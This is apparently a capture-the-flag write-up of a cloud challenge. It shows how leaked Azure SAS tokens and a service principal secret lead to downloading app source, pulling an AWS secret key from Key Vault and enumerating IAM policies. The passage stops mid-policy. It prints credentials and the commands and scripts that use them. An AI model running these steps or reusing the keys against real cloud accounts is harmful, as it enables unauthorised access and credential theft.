---
layout: default
title: Secret of Meow Olympurr 
permalink: /:path/
parent: Cloud
nav_order: 1
---
# Secret of Meow Olympurr 

> Points: 725 [?]

## Description

> Jaga reached Meow Olympurr and met some native Meows. While cautious at first, they warmed up and shared that they have recently created a website to promote tourism!
> However, the young Meows explained that they are not cy-purr security trained and would like to understand what they might have misconfigured in their environments. The young Meows were trying to get two different environments to work together, but it seems like something is breaking....
> Log a cy-purr security case by invoking the mysterious function and retrieve the secret code!
> d2p9lw76n0gfo0.cloudfront.net

## Solution

- [Secret of Meow Olympurr](#secret-of-meow-olympurr)
  - [Description](#description)
  - [Solution](#solution)
    - [d2p9lw76n0gfo0.cloudfront.net](#d2p9lw76n0gfo0cloudfrontnet)
    - [meowolympurr.z23.web.core.windows.net (Part 1)](#meowolympurrz23webcorewindowsnet-part-1)
    - [olympurr-app.azurewebsites.net](#olympurr-appazurewebsitesnet)
    - [meowolympurr.z23.web.core.windows.net (Part 2)](#meowolympurrz23webcorewindowsnet-part-2)
    - [meowolympurr.blob.core.windows.net](#meowolympurrblobcorewindowsnet)
    - [Signing in to Azure](#signing-in-to-azure)
    - [`scm-releases` container](#scm-releases-container)
    - [Analyzing source code](#analyzing-source-code)
    - [Extracting the _AWS Secret Access Key_ from the _Azure Key Vault_](#extracting-the-aws-secret-access-key-from-the-azure-key-vault)
    - [Enumerating AWS Account](#enumerating-aws-account)
    - [Finding the secret AWS lambda function within AWS Log Groups](#finding-the-secret-aws-lambda-function-within-aws-log-groups)
  - [Flag](#flag)


### d2p9lw76n0gfo0.cloudfront.net

Browsing to the given URL, we are presented with what seems to be a page about cats? 

![](2022-12-06-11-14-34.png)

Nothing seems out of the ordinary from the HTML source, but when browsing to a URL that does not exist, we observe the following HTML content:

```html
<main role="main">
    <div class="album py-5 bg-light">
        <div class="container d-flex justify-content-center">
            <div class="row">
                <div class="col-sm">
                </div>
                <div class="col-sm" >
                <img src="http://18.141.147.115:8080/https://meowolympurr.z23.web.core.windows.net/images/ohno.jpg"/>
                </div>
                <div class="col-sm">
                </div>
                
            </div>
            </div>
    </div>
                
</main>
```

We see the URL: `http://18.141.147.115:8080/https://meowolympurr.z23.web.core.windows.net/images/ohno.jpg`, which was pretty suspicious as we are seeing a URL being appended to another URL. What's going on?

Browsing to `http://18.141.147.115:8080`, we see that an instance of the [`Rob--W/cors-anywhere`](https://github.com/Rob--W/cors-anywhere) project being hosted.

![](2022-12-06-11-20-05.png)

We can probably deduce that this is to allow images from another origin, i.e `https://meowolympurr.z23.web.core.windows.net/`, to be loaded by the browser. But where does this new URL lead to?


### meowolympurr.z23.web.core.windows.net (Part 1)

![](2022-12-06-11-26-07.png)

Browsing to the URL, we are presented yet again the same page. Or is it?

Scrolling down, we observe a new section.

![](2022-12-06-11-27-48.png)

### olympurr-app.azurewebsites.net

Clicking on the link directed us to `https://olympurr-app.azurewebsites.net/api/meowvellous`.

![](2022-12-06-11-28-54.png)

It seems to be a page that allows us to fetch the contents of any arbitrary URL via the use the `url` query parameter. The few things we tried were:

1) Azure Instance Metadata service at `http://169.254.169.254/metadata/instance`
2) Localhost at `http://127.0.0.1:XXXX`

None returned any useful response, so we can deduce that SSRF (Service-Side Request Forgery) exploitation might not be the way forward.

### meowolympurr.z23.web.core.windows.net (Part 2)

Returning back to this URL, we accidentally browsed to a non-existent page and we observe the following HTML content:

```html
<main role="main">
    <!--
        To do
        * Integrate services hosted on different cloud platforms
    -->
    <div class="album py-5 bg-light">
        <div class="container d-flex justify-content-center">
            <div class="row">
                <div class="col-sm">
                </div>
                <div class="col-sm" >
                <img src="images/ohno.jpg?sv=2017-07-29&ss=b&srt=sco&sp=rl&se=2022-12-12T00:00:00Z&st=2022-09-01T00:00:00Z&spr=https&sig=UE2%2FTMTAzDnyJEABpX4OYFBs1b1uAWjwEEAtjeQtwxg%3D"/>
                </div>
                <div class="col-sm">
                </div>
                
            </div>
        </div>
    </div>

    <!-- 
        For access to website source codes: 
        https://meowolympurr.blob.core.windows.net?sv=2017-07-29&ss=b&srt=sco&sp=rl&se=2022-12-12T00:00:00Z&st=2022-09-01T00:00:00Z&spr=https&sig=UE2%2FTMTAzDnyJEABpX4OYFBs1b1uAWjwEEAtjeQtwxg%3D
    -->
    
</main>
```

We see that the `ohno.jpg` URL having a bunch of query parameters appended to it and further down, we see a comment about accessing the source code of the website via a new URL.

### meowolympurr.blob.core.windows.net

Browsing to `https://meowolympurr.blob.core.windows.net?sv=2017-07-29&ss=b&srt=sco&sp=rl&se=2022-12-12T00:00:00Z&st=2022-09-01T00:00:00Z&spr=https&sig=UE2%2FTMTAzDnyJEABpX4OYFBs1b1uAWjwEEAtjeQtwxg%3D`, we get an error:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Error>
   <Code>InvalidQueryParameterValue</Code>
   <Message>Value for one of the query parameters specified in the request URI is invalid.
RequestId:34895dab-701e-0052-5524-099fba000000
Time:2022-12-06T03:37:24.3093623Z</Message>
   <QueryParameterName>comp</QueryParameterName>
   <QueryParameterValue />
   <Reason />
</Error>
```

It's complaining that the `comp` query parameter is missing. Based on the hostname portion of the URL (`*.blob.core.windows.net`), we can tell that this was an _Azure Blob Storage_ service. While reading up the API documentation, we learn that we can use the [List Containers](https://learn.microsoft.com/en-us/rest/api/storageservices/list-containers2?tabs=azure-ad) API to retrieve the list of containers under this URL:

`https://meowolympurr.blob.core.windows.net?sv=2017-07-29&ss=b&srt=sco&sp=rl&se=2022-12-12T00:00:00Z&st=2022-09-01T00:00:00Z&spr=https&sig=UE2%2FTMTAzDnyJEABpX4OYFBs1b1uAWjwEEAtjeQtwxg%3D&comp=list` (Note the `comp=list` at the end)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<EnumerationResults ServiceEndpoint="https://meowolympurr.blob.core.windows.net/">
	<Containers>
		<Container>
			<Name>$web</Name>
			<Properties>
				<Last-Modified>Fri, 18 Nov
 2022 03:23:11 GMT</Last-Modified>
				<Etag>"0x8DAC914387D8CC7"</Etag>
				<LeaseStatus>unlocked</LeaseStatus>
				<LeaseState>available</LeaseState>
			</Properties>
		</Container>
		<Container>
			<Name>dev</Name>
			<Properties>
				<Last-Modified>Fri, 18 Nov 2022 03:23:11 GMT</Last-Modified>
				<Etag>"0x8DAC91438FC71A6"</Etag>
				<LeaseStatus>unlocked</LeaseStatus>
				<LeaseState>available</LeaseState>
			</Properties>
		</Container>
	</Containers>
	<NextMarker />
</EnumerationResults>
```

The `dev` container looked interesting so lets use the [List Blobs](https://learn.microsoft.com/en-us/rest/api/storageservices/list-blobs?tabs=azure-ad) API to list the blobs in this container:

`https://meowolympurr.blob.core.windows.net/dev?sv=2017-07-29&ss=b&srt=sco&sp=rl&se=2022-12-12T00:00:00Z&st=2022-09-01T00:00:00Z&spr=https&sig=UE2%2FTMTAzDnyJEABpX4OYFBs1b1uAWjwEEAtjeQtwxg%3D&comp=list&restype=container` (Note the `/dev` path and the `comp=list` and `restype=container` at the end)

```xml
<?xml version="1.0" encoding="utf-8"?>
<EnumerationResults ServiceEndpoint="https://meowolympurr.blob.core.windows.net/" ContainerName="dev">
	<Blobs>
		<Blob>
			<Name>readme.md</Name>
			<Properties>
				<Last-Modified>Fri, 18 Nov 2022 03:23:56 GMT</Last-Modified>
				<Etag>0x8DAC9145356C5EF</Etag>
				<Content-Length>901</Content-Length>
				<Content-Type>text/plain</Content-Type>
				<Content-Encoding />
				<Content-Language />
				<Content-MD5 />
				<Cache-Control />
				<Content-Disposition />
				<BlobType>BlockBlob</BlobType>
				<AccessTier>Hot</AccessTier>
				<AccessTierInferred>true</AccessTierInferred>
				<LeaseStatus>unlocked</LeaseStatus>
				<LeaseState>available</LeaseState>
				<ServerEncrypted>true</ServerEncrypted>
			</Properties>
		</Blob>
	</Blobs>
	<NextMarker />
</EnumerationResults>
```

We see that there is a `readme.md` file. 

`https://meowolympurr.blob.core.windows.net/dev/readme.md?sv=2017-07-29&ss=b&srt=sco&sp=rl&se=2022-12-12T00:00:00Z&st=2022-09-01T00:00:00Z&spr=https&sig=UE2%2FTMTAzDnyJEABpX4OYFBs1b1uAWjwEEAtjeQtwxg%3D` (Note the `/dev/readme.md` path)

```
# Meow Olympurr 
One stop service for all fun activites in Meow Olympurr! 
    
All resources are hosted on a single tenant: 83e595f4-f086-4f2f-9de8-d698b6012093

Meows are not cy-purr security trained, but we are willing to learn! 
    
# To do 
1. Consolidate the asset list 
2. Seek advice from Jaga and team when they arrive! 
3. Integrate services 
4. Remove credentials used for debugging access to function app

# Function app - https://olympurr-app.azurewebsites.net/api/meowvellous
SAS token to access the scm-releases container: ?sv=2018-11-09&sr=c&st=2022-09-01T00%3A00%3A00Z&se=2022-12-12T00%3A00%3A00Z&sp=rl&spr=https&sig=jENgCFTrC1mYM1ZNo%2F8pq1Hg9BO1VLbXlk%2FpABrK4Eo%3D

## Credentials for debugging
The following service principal has the same privileges as the function app
Application ID: ee92075f-4ddc-4522-a12c-2bc0ab874c85
Client Secret: kmk8Q~mGYD9jNfgm~rcIOMRgiC9ekKtNEw5GPaS7
```

It does seem a little intimidating at first when confronted with a ton of mysterious IDs and secrets, but online documentation was a big help in telling us the way forward.

### Signing in to Azure

Using the `Application ID`, `Client Secret` and `Tenant ID`, we would be able to sign in to Azure using the Azure CLI tool, which can be installed by running `sudo apt-get install azure-cli`.

Next, we can do the following:

```bash
$ az login \
    --service-principal \
    -u ee92075f-4ddc-4522-a12c-2bc0ab874c85 \
    -p kmk8Q~mGYD9jNfgm~rcIOMRgiC9ekKtNEw5GPaS7 \
    --tenant 83e595f4-f086-4f2f-9de8-d698b6012093
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "83e595f4-f086-4f2f-9de8-d698b6012093",
    "id": "bb11df92-eff5-47b6-b940-a3ce6ded6431",
    "isDefault": true,
    "managedByTenants": [],
    "name": "STF2022",
    "state": "Enabled",
    "tenantId": "83e595f4-f086-4f2f-9de8-d698b6012093",
    "user": {
      "name": "ee92075f-4ddc-4522-a12c-2bc0ab874c85",
      "type": "servicePrincipal"
    }
  }
]
```

Seeing that response meant that we were able to successfully login.

### `scm-releases` container

Referring back to the `readme.md`, there was a note about the `scm-releases` container and we are given the SAS token for it. Since we did not see the `scm-releases` container when we used [List Containers](https://learn.microsoft.com/en-us/rest/api/storageservices/list-containers2?tabs=azure-ad) API on `meowolympurr` storage account, we can deduce that the `scm-releases` container resides in another storage account. Could we see if we can find any other storage accounts?

```bash
$ az storage account list            
[
  {
    ...
    "name": "meowolympurr",
    ...
    "primaryEndpoints": {
      "blob": "https://meowolympurr.blob.core.windows.net/",
      "dfs": "https://meowolympurr.dfs.core.windows.net/",
      "file": "https://meowolympurr.file.core.windows.net/",
      "internetEndpoints": null,
      "microsoftEndpoints": null,
      "queue": "https://meowolympurr.queue.core.windows.net/",
      "table": "https://meowolympurr.table.core.windows.net/",
      "web": "https://meowolympurr.z23.web.core.windows.net/"
    },
    ...
  },
  {
    ...
    "name": "meowvellousappstorage",
    ...
    "primaryEndpoints": {
      "blob": "https://meowvellousappstorage.blob.core.windows.net/",
      "dfs": "https://meowvellousappstorage.dfs.core.windows.net/",
      "file": "https://meowvellousappstorage.file.core.windows.net/",
      "internetEndpoints": null,
      "microsoftEndpoints": null,
      "queue": "https://meowvellousappstorage.queue.core.windows.net/",
      "table": "https://meowvellousappstorage.table.core.windows.net/",
      "web": "https://meowvellousappstorage.z23.web.core.windows.net/"
    },
    ...
  }
]
```

We listed the storage accounts and we spot a new storage account called `meowvellousappstorage`. 

With the storage account name, container name and SAS token, we can now list the blobs in the `scm-releases` container.

```bash
$ az storage blob list \
    --container-name scm-releases \
    --account-name meowvellousappstorage \
    --sas-token "?sv=2018-11-09&sr=c&st=2022-09-01T00%3A00%3A00Z&se=2022-12-12T00%3A00%3A00Z&sp=rl&spr=https&sig=jENgCFTrC1mYM1ZNo%2F8pq1Hg9BO1VLbXlk%2FpABrK4Eo%3D" \
[
  {
    "container": "scm-releases",
    ...
    "name": "scm-latest-olympurr-app.zip",
    ...
  }
]
```

We see that there is a `scm-latest-olympurr-app.zip` blob stored in this container, which we can download.

```bash
$ az storage blob download \
    --container-name scm-releases \
    --account-name meowvellousappstorage \
    --sas-token "?sv=2018-11-09&sr=c&st=2022-09-01T00%3A00%3A00Z&se=2022-12-12T00%3A00%3A00Z&sp=rl&spr=https&sig=jENgCFTrC1mYM1ZNo%2F8pq1Hg9BO1VLbXlk%2FpABrK4Eo%3D" \
    -n scm-latest-olympurr-app.zip \
    -f scm-latest-olympurr-app.zip
Finished[#############################################################]  100.0000%
...
```

### Analyzing source code

Since we thought it was a ZIP file, we tried uncompressing it using `unzip`:

```bash
$ unzip scm-latest-olympurr-app.zip 
Archive:  scm-latest-olympurr-app.zip
  End-of-central-directory signature not found.  Either this file is not
  a zipfile, or it constitutes one disk of a multi-part archive.  In the
  latter case the central directory and zipfile comment will be found on
  the last disk(s) of this archive.
unzip:  cannot find zipfile directory in one of scm-latest-olympurr-app.zip or
        scm-latest-olympurr-app.zip.zip, and cannot find scm-latest-olympurr-app.zip.ZIP, period.
```

On closer inspection using `file`, we learnt that it was a `Squash filesystem`?

```bash
$ file scm-latest-olympurr-app.zip 
scm-latest-olympurr-app.zip: Squashfs filesystem, little endian, version 4.0, zlib compressed, 18614681 bytes, 4387 inodes, blocksize: 131072 bytes, created: Fri Nov 18 03:26:06 2022
```

To actually access it, we can use the `unsquashfs` command:

```bash
$ unsquashfs scm-latest-olympurr-app.zip
Parallel unsquashfs: Using 4 processors
3383 inodes (3817 blocks) to write

[===================================================================/] 7200/7200 100%

created 3383 files
created 1004 directories
created 0 symlinks
created 0 devices
created 0 fifos
created 0 sockets
created 0 hardlinks
```

After that is done, we will be able to see the source code files in the `./squashfs-root` directory:

```bash
$ ls squashfs-root
host.json  meowvellous  oryx-manifest.toml  requirements.txt
```

Under the `meowvellous` directory, there was a `__init__.py` which contained the source code of the function app at `https://olympurr-app.azurewebsites.net/api/meowvellous`:

```python
import boto3
import requests
import json

import azure.functions as func
from azure.identity import ManagedIdentityCredential
from azure.keyvault.secrets import SecretClient

functionName = "event-webservice"
keyName = "AKIA5G4XMRW7TLT6XD7R"

def logURL(url):
    identity = ManagedIdentityCredential()
    secretClient = SecretClient(vault_url="https://olympurr-aws.vault.azure.net/", credential=identity)
    secret = secretClient.get_secret(keyName).value
    session = boto3.Session(
        aws_access_key_id=keyName,
        aws_secret_access_key=secret
    )
    
    lambda_client = session.client("lambda", region_name="ap-southeast-1")

    details = {"url" : url}
    lambda_client.invoke(
        FunctionName=functionName,
        InvocationType="RequestResponse",
        Payload=bytes(json.dumps(details), "utf-8")
    )
    return secret

def main(req: func.HttpRequest) -> func.HttpResponse:
    url = req.params.get('url')

    if not url:
        try:
            req_body = req.get_json()
        except ValueError:
            pass
        else:
            name = req_body.get('url')

    if url:
        # Log the URL in AWS 
        secret = logURL(url)
        try:
            response = requests.get(url)
            return func.HttpResponse(response.text)
        except Exception as e:
            return func.HttpResponse(str(e))
    
    return func.HttpResponse(
            """Found an interesting event you would like to organise in Meow Olympurr?
Pass the URL as a query string. You will see the submitted information if it is successful. 
e.g. https://olympurr-app.azurewebsites.net/api/meowvellous?url=<INSERT>
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠈⠻⣮⣳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⡿⠋⠀⠀⠀⠀⠙⣿⣿⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠿⠿⣿⣷⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⣿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣀⣠⣤⣤⣀⡀⠀⠀⣀⣴⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣄⠀⠀
⢀⣤⣾⡿⠟⠛⠛⢿⣿⣶⣾⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣷⣦⣀⣀⣤⣶⣿⡿⠿⢿⣿⡀⠀
⣿⣿⠏⠀⢰⡆⠀⠀⠉⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⡿⠟⠋⠁⠀⠀⢸⣿⠇⠀
⣿⡟⠀⣀⠈⣀⡀⠒⠃⠀⠙⣿⡆⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠇⠀
⣿⡇⠀⠛⢠⡋⢙⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀
⣿⣧⠀⠀⠀⠓⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠋⠀⠀⢸⣧⣤⣤⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠀⠀
⣿⣿⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠻⣷⣶⣶⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⠁⠀⠀
⠈⠛⠻⠿⢿⣿⣷⣶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡏⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠻⠿⢿⣿⣷⣶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⡄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠻⠿⢿⣿⣷⣶⣦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⠿⣿⣷⣶⣶⣤⣤⣀⡀⠀⠀⠀⢀⣴⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡿⣄
   Send us the details!            ⠀⠀⠉⠉⠛⠛⠿⠿⣿⣷⣶⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣹
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⢸⣧
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣆⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣶⣾⣿⣿⣿⣿⣤⣄⣀⡀⠀⠀⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣻⣷⣶⣾⣿⣿⡿⢯⣛⣛⡋⠁⠀⠀⠉⠙⠛⠛⠿⣿⣿⡷⣶⣿
            """,
            status_code=200
    )
```

What could our attention was the `functionName` and `keyName` values, as well as the use of _Azure Key Vault_ at `https://olympurr-aws.vault.azure.net/`. 

Here is what the code of this function app does:
1) Use its current Azure credentials to access the _Azure Key Vault_
2) Retrieves the secret that corresponds to the `AKIA5G4XMRW7TLT6XD7R` key in the _Azure Key Vault_
3) Use the secret as an _AWS Secret Access Key_ along with `AKIA5G4XMRW7TLT6XD7R` as the _AWS Access Key ID_ to trigger the `event-webservice` _AWS Lambda_ function

### Extracting the _AWS Secret Access Key_ from the _Azure Key Vault_

Rather than attempting to find the Azure CLI equivalent of the source code, we will instead create a copy of it and tune it accordingly to suit our purpose of extracting the _AWS Secret Access Key_ from the _Azure Key Vault_.

```python
import boto3
import requests
import json

import azure.functions as func
from azure.identity import DefaultAzureCredential 
from azure.keyvault.secrets import SecretClient

functionName = "event-webservice"
keyName = "AKIA5G4XMRW7TLT6XD7R"

# Changed from ManagedIdentityCredential() to DefaultAzureCredential()
identity = DefaultAzureCredential()
secretClient = SecretClient(vault_url="https://olympurr-aws.vault.azure.net/", credential=identity)
secret = secretClient.get_secret(keyName).value

print("AWS Secret Access Key:", secret)
```

After installing the required libraries and running this script, we successfully retrieved the _AWS Secret Access Key_:

```bash
$ python3 export.py
AWS Secret Access Key: fgQdSIETJp/yBKwWbmf2SprGa2eXWyqgkeeIdWtL
```

### Enumerating AWS Account

<!-- Using the [andresriancho/enumerate-iam](https://github.com/andresriancho/enumerate-iam) tool to enumerate the permissions on this set of AWS credentials,

```bash
$ git clone https://github.com/andresriancho/enumerate-iam
$ cd enumerate-iam
$ pip3 install -r requirements.txt
$ python3 enumerate-iam.py \
    --secret-key fgQdSIETJp/yBKwWbmf2SprGa2eXWyqgkeeIdWtL \
    --access-key AKIA5G4XMRW7TLT6XD7R
...
2022-12-06 13:21:50,095 - 118540 - [INFO] Attempting common-service describe / list brute force.
2022-12-06 13:21:57,360 - 118540 - [INFO] -- logs.describe_log_groups() worked!
``` -->

We then proceed to use the AWS CLI tool to sign into AWS.

```bash
$ aws configure
AWS Access Key ID [None]: AKIA5G4XMRW7TLT6XD7R
AWS Secret Access Key [None]: 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
Default region name [None]: ap-southeast-1
Default output format [None]: json
$ aws sts get-caller-identity
{
    "UserId": "AIDA5G4XMRW7UAWT26Q6Q",
    "Account": "908166204863",
    "Arn": "arn:aws:iam::908166204863:user/azure_user"
}
```

We see that we are logged in as `azure_user`. Lets see what policies that are currently attached to us:

```bash
$ aws iam list-attached-user-policies --user-name azure_user 
{
    "AttachedPolicies": [
        {
            "PolicyName": "azure-policy",
            "PolicyArn": "arn:aws:iam::908166204863:policy/azure-policy"
        },
        {
            "PolicyName": "azure-policy-extended",
            "PolicyArn": "arn:aws:iam::908166204863:policy/azure-policy-extended"
        }
    ]
}

$ aws iam get-policy-version --policy-arn arn:aws:iam::908166204863:policy/azure-policy --version-id v1         
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "iam:GetPolicy",
                        "iam:GetPolicyVersion"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Action": [
                        "iam:ListAttachedUserPolicies"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:iam::908166204863:user/azure_user"
                },
                {
                    "Action": [
                        "lambda:Invoke*",
                        "lambda:ListFunctions",
                        "lambda:CreateFunction",
                        "logs:CreateLogGroup",
                        "logs:CreateLogStream",
                        "logs:PutLogEvents",
                        "lambda:UpdateFunctionCode"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2022-11-18T03:22:31Z"
    }
}

$ aws iam get-policy-version --policy-arn arn:aws:iam::908166204863:policy/azure-policy-extended --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "iam:GetPolicy",
                        "iam:GetPolicyVersion",
                        "iam:AddUserToGroup",
                        "iam:AttachUserPolicy",
                        "iam:CreateRole",
                        "iam:AttachRolePolicy",
                        "iam:PassRole"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Action": [
                        "iam:ListAttachedUserPolicies",
                        "iam:GetUser"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:iam::908166204863:user/azure_user"
                },
                {
                    "Action": [
                        "lambda:Invoke*",
                        "lambda:ListFunctions",
                        "lambda:CreateFunction",
                        "logs:DescribeLogGroups",
                        "logs:DescribeLogStreams",
                        "logs:GetLogEvents",
                        "lambda:UpdateFunctionCode"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Action": [
                        "cloudformation:CreateStack"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2022-11-18T03:22:31Z"
    }
}
```

The `azure_user` has the `lambda:ListFunctions`. Lets see if we can find any other lambda functions that we might be able to trigger:

```bash
$ aws lambda list-functions

An error occurred (AccessDeniedException) when calling the ListFunctions operation: User: arn:aws:iam::908166204863:user/azure_user is not authorized to perform: lambda:ListFunctions on resource: * with an explicit deny in a permissions boundary
```

Unfortunately, there was a _Permissions Boundary_ policy set on the `azure_user` account that prevents us from listing the lambda functions.

```bash
$ aws iam get-user
{
    "User": {
        "Path": "/",
        "UserName": "azure_user",
        "UserId": "AIDA5G4XMRW7UAWT26Q6Q",
        "Arn": "arn:aws:iam::908166204863:user/azure_user",
        "CreateDate": "2022-11-18T03:22:30Z",
        "PermissionsBoundary": {
            "PermissionsBoundaryType": "Policy",
            "PermissionsBoundaryArn": "arn:aws:iam::908166204863:policy/azure-policy-permissions-boundary"
        }
    }
}

$ aws iam get-policy-version --policy-arn arn:aws:iam::908166204863:policy/azure-policy-permissions-boundary --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "iam:*",
                        "lambda:*"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Action": [
                        "lambda:*"
                    ],
                    "Effect": "Deny",
                    "Resource": "arn:aws:lambda:ap-southeast-1:908166204863:function:amplify-*"
                },
                {
                    "Action": [
                        "lambda:InvokeAsync",
                        "iam:Generate*",
                        "iam:Add*",
                        "iam:Create*",
                        "iam:Put*",
                        "lambda:InvokeFunctionUrl",
                        "iam:Delete*",
                        "logs:Put*",
                        "iam:Deactivate*",
                        "iam:Enable*",
                        "logs:Create*",
                        "iam:Pass*",
                        "lambda:List*",
                        "iam:Attach*",
                        "lambda:Create*",
                        "lambda:Update*",
                        "cloudformation:*"
                    ],
                    "Effect": "Deny",
                    "Resource": "*"
                },
                {
                    "Action": [
                        "logs:Describe*"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Action": [
